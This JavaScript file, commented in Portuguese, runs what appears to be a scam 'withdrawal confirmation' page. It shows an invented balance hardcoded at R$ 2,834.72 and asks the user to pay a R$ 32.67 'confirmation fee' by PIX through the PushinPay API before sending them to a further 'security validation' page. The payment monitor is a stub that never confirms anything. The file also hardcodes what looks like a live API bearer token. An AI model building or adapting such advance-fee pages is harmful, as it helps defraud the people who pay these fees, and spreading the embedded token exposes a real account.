// JavaScript limpo para página de Confirmação

// Configuração PushinPay (carregada de config.js)
const PUSHINPAY_TOKEN = window.PUSHINPAY_CONFIG?.TOKEN || '41318|bODMbwNQeMxLmie39obUSfBOLQNa8cY0w7C7Agoj499d9c33';

const BALANCE = 2834.72;
const CONFIRMATION_FEE = 32.67;

// Função de animação de contagem
function animateCounter(element, targetValue, duration = 2000, delay = 500) {
    let startTime = null;
    let animationFrame = null;
    let isAnimating = false;

    const animate = (currentTime) => {
        if (!startTime) startTime = currentTime;
        const elapsed = currentTime - startTime;
        const progress = Math.min(elapsed / duration, 1);

        // Easing function: ease-out
        const eased = 1 - Math.pow(1 - progress, 4);
        const currentValue = eased * targetValue;

        // Formatar como moeda brasileira
        const formatted = currentValue.toLocaleString('pt-BR', {
            style: 'currency',
            currency: 'BRL'
        }).replace('R$', 'R$ ');

        element.textContent = formatted;

        if (progress < 1) {
            animationFrame = requestAnimationFrame(animate);
        } else {
            // Garantir valor final exato
            const finalFormatted = targetValue.toLocaleString('pt-BR', {
                style: 'currency',
                currency: 'BRL'
            }).replace('R$', 'R$ ');
            element.textContent = finalFormatted;
            isAnimating = false;
        }
    };

    const start = () => {
        if (!isAnimating) {
            isAnimating = true;
            startTime = null;
            setTimeout(() => {
                animationFrame = requestAnimationFrame(animate);
            }, delay);
        }
    };

    return { start };
}

// Formatar valor como moeda
function formatCurrency(value) {
    return value.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).replace('R$', 'R$ ');
}

// Obter parâmetros da URL
function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    return {
        amount: parseFloat(params.get('amount')) || BALANCE,
        name: params.get('name') || '',
        pixKey: params.get('pixKey') || '',
        pixKeyType: params.get('pixKeyType') || 'E-mail'
    };
}

// Criar pagamento PIX via PushinPay API
async function createPixPayment(amount, payerName, pixKey, pixKeyType, supabaseClient = null) {
    try {
        const token = PUSHINPAY_TOKEN;

        // Verificação removida - permitir requisições

        // Converter valor de reais para centavos (API PushinPay requer centavos)
        const valueInCents = Math.round(parseFloat(amount) * 100);

        // Valor mínimo é 50 centavos
        if (valueInCents < 50) {
            throw new Error('Valor mínimo é R$ 0,50');
        }

        const requestBody = {
            value: valueInCents
            // webhook_url e split_rules são opcionais
        };

        const response = await fetch('https://api.pushinpay.com.br/api/pix/cashIn', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestBody)
        }).catch(err => {
            // Erro de rede/CORS
            if (err.message.includes('Failed to fetch') || err.message.includes('NetworkError')) {
                throw new Error('Erro de conexão. Verifique:\n1. Se está usando http://localhost:8000 (não file://)\n2. Se sua internet está funcionando\n3. Se a API PushinPay está acessível');
            }
            throw new Error(`Erro de conexão: ${err.message}`);
        });

        if (!response.ok) {
            let errorMessage = `Erro HTTP: ${response.status}`;
            try {
                const errorData = await response.json();
                errorMessage = errorData.message || errorData.error || errorMessage;
            } catch (e) {
                const errorText = await response.text();
                if (errorText) errorMessage = errorText;
            }
            throw new Error(errorMessage);
        }

        const data = await response.json();

        if (!data) {
            throw new Error('Resposta vazia da API');
        }

        // Ajustar formato da resposta para o formato esperado pelo código
        return {
            success: true,
            paymentId: data.id,
            qrcode: data.qr_code,
            qrCode: data.qr_code_base64, // Para compatibilidade com showPixModal
            qrcodeImage: data.qr_code_base64,
            copyPaste: data.qr_code,
            status: data.status,
            value: data.value
        };
    } catch (error) {
        throw new Error(error.message || 'Erro ao gerar QR Code PIX. Verifique sua conexão e tente novamente.');
    }
}

// Consultar status do PIX na PushinPay
// NOTA: A API PushinPay não possui endpoint público para consulta de status
// O status será verificado via webhook ou não será verificado automaticamente
async function checkPixStatus(paymentId, supabaseClient = null) {
    // Endpoint não disponível na API PushinPay
    // Retornar null silenciosamente - o pagamento será confirmado via webhook se configurado
    return null;
}

// Monitorar confirmação de pagamento
// NOTA: A API PushinPay não possui endpoint público para verificação de status
// O pagamento será confirmado via webhook se configurado no painel PushinPay
// Esta função não faz polling para evitar erros 404 no console
function monitorPaymentConfirmation(paymentId, onConfirmed, supabaseClient = null) {
    // A API PushinPay não possui endpoint público para verificação de status
    // O pagamento deve ser confirmado via webhook configurado no painel
    // Por enquanto, não fazemos polling para evitar erros no console

    // Se você configurar webhook, ele será chamado automaticamente pela PushinPay
    // quando o pagamento for confirmado

    // Retornar função de limpeza vazia
    return () => {
        // Nada para limpar
    };
}

// Variável para armazenar o código PIX atual
let currentPixCode = '';

// Mostrar estado de loading no modal
function showPixLoading() {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const modalAmount = document.getElementById('modalAmount');

    if (!modal) return;

    // Esconder outros estados
    if (errorState) errorState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');

    // Mostrar loading
    if (loadingState) loadingState.classList.remove('hidden');

    // Mostrar modal
    modal.classList.remove('hidden');
}

// Mostrar estado de erro no modal
function showPixError(errorMessage) {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const errorMsgEl = document.getElementById('errorMessage');

    if (!modal) return;

    // Esconder outros estados
    if (loadingState) loadingState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');

    // Mostrar erro
    if (errorState) errorState.classList.remove('hidden');
    if (errorMsgEl) errorMsgEl.textContent = errorMessage || 'Ocorreu um erro ao gerar o QR Code PIX.';

    // Modal já está visível
}

// Mostrar modal com QR Code PIX (estado de sucesso)
function showPixModal(paymentData, amount) {
    const modal = document.getElementById('pixModal');
    const qrCodeImage = document.getElementById('qrCodeImage');
    const pixCode = document.getElementById('pixCode');
    const modalAmount = document.getElementById('modalAmount');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');

    if (!modal || !qrCodeImage || !pixCode) {
        return;
    }

    // Garantir que o modal está visível PRIMEIRO
    modal.classList.remove('hidden');
    modal.style.display = 'flex';
    modal.style.opacity = '1';
    modal.style.zIndex = '50';

    // Esconder outros estados
    if (loadingState) loadingState.classList.add('hidden');
    if (errorState) errorState.classList.add('hidden');
    if (confirmedState) confirmedState.classList.add('hidden');

    // Mostrar sucesso
    if (successState) successState.classList.remove('hidden');

    // Preencher dados - API PushinPay retorna qr_code_base64
    if (paymentData.qrcodeImage) {
        qrCodeImage.src = paymentData.qrcodeImage;
    } else if (paymentData.qrCode) {
        qrCodeImage.src = paymentData.qrCode;
    } else if (paymentData.qrcode) {
        qrCodeImage.src = paymentData.qrcode;
    }

    if (paymentData.copyPaste) {
        currentPixCode = paymentData.copyPaste;
        pixCode.textContent = currentPixCode;
    } else if (paymentData.qrcode) {
        currentPixCode = paymentData.qrcode;
        pixCode.textContent = currentPixCode;
    }

    // Garantir que o modal está visível
    if (modal) {
        modal.classList.remove('hidden');
        modal.style.display = 'flex';
    }
    if (modalAmount) {
        modalAmount.textContent = formatCurrency(amount);
    }

    // Modal já está visível
}

// Mostrar estado de Pagamento Confirmado
function showPixConfirmed(onSuccessCallback) {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');
    const confirmedTitle = document.getElementById('confirmedTitle');
    const confirmedSubtitle = document.getElementById('confirmedSubtitle');
    const confirmedSpinner = document.getElementById('confirmedSpinner');

    if (!modal || !confirmedState) {
        return;
    }


    // Esconder outros estados
    if (loadingState) loadingState.classList.add('hidden');
    if (errorState) errorState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');

    // Mostrar estado de confirmação
    confirmedState.classList.remove('hidden');

    // Resetar animações
    if (confirmedTitle) {
        confirmedTitle.style.opacity = '0';
        confirmedTitle.style.transform = 'translateY(10px)';
    }
    if (confirmedSubtitle) {
        confirmedSubtitle.style.opacity = '0';
    }
    if (confirmedSpinner) {
        confirmedSpinner.style.opacity = '0';
    }

    // Animar título (delay 0.3s)
    setTimeout(() => {
        if (confirmedTitle) {
            confirmedTitle.style.transition = 'opacity 0.5s ease-out, transform 0.5s ease-out';
            confirmedTitle.style.opacity = '1';
            confirmedTitle.style.transform = 'translateY(0)';
        }
    }, 300);

    // Animar subtítulo (delay 0.5s)
    setTimeout(() => {
        if (confirmedSubtitle) {
            confirmedSubtitle.style.transition = 'opacity 0.5s ease-out';
            confirmedSubtitle.style.opacity = '1';
        }
    }, 500);

    // Animar spinner (delay 0.7s)
    setTimeout(() => {
        if (confirmedSpinner) {
            confirmedSpinner.style.transition = 'opacity 0.5s ease-out';
            confirmedSpinner.style.opacity = '1';
        }
    }, 700);

    // Executar callback após 1.5 segundos
    setTimeout(() => {
        if (onSuccessCallback) {
            onSuccessCallback();
        }
    }, 1500);
}

// Inicializar eventos do modal
function initPixModalEvents() {
    const modal = document.getElementById('pixModal');
    const closeModalBtn = document.getElementById('closeModalBtn');
    const copyPixBtn = document.getElementById('copyPixBtn');

    if (!modal) return;

    // Fechar modal ao clicar no X
    if (closeModalBtn) {
        closeModalBtn.onclick = () => {
            modal.classList.add('hidden');
        };
    }

    // Fechar modal ao clicar fora
    modal.onclick = (e) => {
        if (e.target === modal) {
            modal.classList.add('hidden');
        }
    };

    // Copiar código PIX
    if (copyPixBtn) {
        copyPixBtn.onclick = async () => {
            if (!currentPixCode) return;

            try {
                await navigator.clipboard.writeText(currentPixCode);

                // Feedback visual
                const originalHTML = copyPixBtn.innerHTML;
                copyPixBtn.innerHTML = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check w-4 h-4">
                        <path d="M20 6 9 17l-5-5"></path>
                    </svg>
                `;
                copyPixBtn.classList.add('bg-emerald-500', 'hover:bg-emerald-600');
                copyPixBtn.classList.remove('bg-[#E94560]', 'hover:bg-[#d63d56]');

                setTimeout(() => {
                    copyPixBtn.innerHTML = originalHTML;
                    copyPixBtn.classList.remove('bg-emerald-500', 'hover:bg-emerald-600');
                    copyPixBtn.classList.add('bg-[#E94560]', 'hover:bg-[#d63d56]');
                }, 2000);
            } catch (error) {
                alert('Erro ao copiar código. Tente selecionar e copiar manualmente.');
            }
        };
    }
}

// Inicializar ao carregar
window.addEventListener('load', () => {

    // Inicializar eventos do modal PIX
    initPixModalEvents();

    const params = getUrlParams();

    // Debug: Log dos parâmetros recebidos

    // Preencher dados do usuário
    const userNameEl = document.querySelector('.user-name');
    const pixKeyTypeEl = document.querySelector('.pix-key-type');
    const pixKeyValueEl = document.querySelector('.pix-key-value');
    const currentDateEl = document.querySelector('.current-date');

    if (userNameEl) userNameEl.textContent = params.name || '-';
    if (pixKeyTypeEl) pixKeyTypeEl.textContent = params.pixKeyType || '-';
    if (pixKeyValueEl) pixKeyValueEl.textContent = params.pixKey || '-';
    if (currentDateEl) {
        const today = new Date();
        currentDateEl.textContent = today.toLocaleDateString('pt-BR', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
        });
    }

    // Atualizar valores
    const amountDisplays = document.querySelectorAll('.amount-display');
    amountDisplays.forEach(el => {
        el.textContent = formatCurrency(params.amount);
    });

    // Animação do saldo
    const balanceElement = document.querySelector('.balance-display');
    if (balanceElement) {
        const counter = animateCounter(balanceElement, BALANCE, 2000, 100);
        counter.start();
    }

    // Animação da taxa
    const feeDisplays = document.querySelectorAll('.fee-display, .fee-display-text');
    feeDisplays.forEach(el => {
        el.textContent = formatCurrency(CONFIRMATION_FEE);
    });

    // Função para processar pagamento PIX
    async function processPixPayment() {
        try {
            // Mostrar loading
            showPixLoading();

            // Criar pagamento PIX
            const paymentData = await createPixPayment(CONFIRMATION_FEE, params.name, params.pixKey, params.pixKeyType);

            if (paymentData && paymentData.paymentId) {
                // Monitorar confirmação
                monitorPaymentConfirmation(paymentData.paymentId, (confirmation) => {
                    // Mostrar tela de "Pagamento Confirmado" e redirecionar
                    showPixConfirmed(() => {
                        // Redirecionar para próxima página com parâmetros
                        const nextUrl = `validacao-seguranca.html?name=${encodeURIComponent(params.name)}&pixKey=${encodeURIComponent(params.pixKey)}&pixKeyType=${encodeURIComponent(params.pixKeyType)}`;
                        window.location.href = nextUrl;
                    });
                });

                // Mostrar modal com QR Code (sucesso)
                showPixModal(paymentData, CONFIRMATION_FEE);
            } else {
                throw new Error('Resposta inválida da API');
            }
        } catch (error) {
            showPixError(error.message || 'Erro ao processar pagamento. Tente novamente.');
        }
    }

    // Botão pagar taxa
    const payFeeBtn = document.getElementById('payFeeBtn');
    if (payFeeBtn) {
        payFeeBtn.addEventListener('click', processPixPayment);
    }

    // Botão tentar novamente (retry)
    const retryPixBtn = document.getElementById('retryPixBtn');
    if (retryPixBtn) {
        retryPixBtn.addEventListener('click', processPixPayment);
    }
});

